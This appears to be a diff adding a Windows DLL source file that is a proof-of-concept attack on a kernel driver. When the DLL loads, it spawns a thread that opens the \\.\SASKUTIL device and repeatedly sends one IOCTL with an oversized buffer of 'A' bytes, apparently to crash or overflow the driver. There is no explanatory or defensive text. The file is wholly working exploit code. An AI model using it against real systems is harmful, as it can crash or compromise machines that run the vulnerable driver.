@@ -1,0 +1,34 @@
+
+void fuzz()
+{
+	DWORD nbBytes = 0;
+	HANDLE hDriver = CreateFileA("\\\\.\\SASKUTIL",GENERIC_READ | GENERIC_WRITE,0,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);
+	char szbuf[0x28d4] = {0x41414141};
+	while (1)
+	{
+		DeviceIoControl(hDriver, 0x9C402078, (LPVOID)szbuf, 0x28d4, (LPVOID)0, 0, &nbBytes, NULL);
+	}
+
+}
+
+
+BOOL APIENTRY DllMain( HMODULE hModule,
+                       DWORD  ul_reason_for_call,
+                       LPVOID lpReserved
+					 )
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+		{
+			CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)fuzz, NULL, NULL, NULL);
+			break;
+		}
+	case DLL_THREAD_ATTACH:
+	case DLL_THREAD_DETACH:
+	case DLL_PROCESS_DETACH:
+		break;
+	}
+	return TRUE;
+}
+
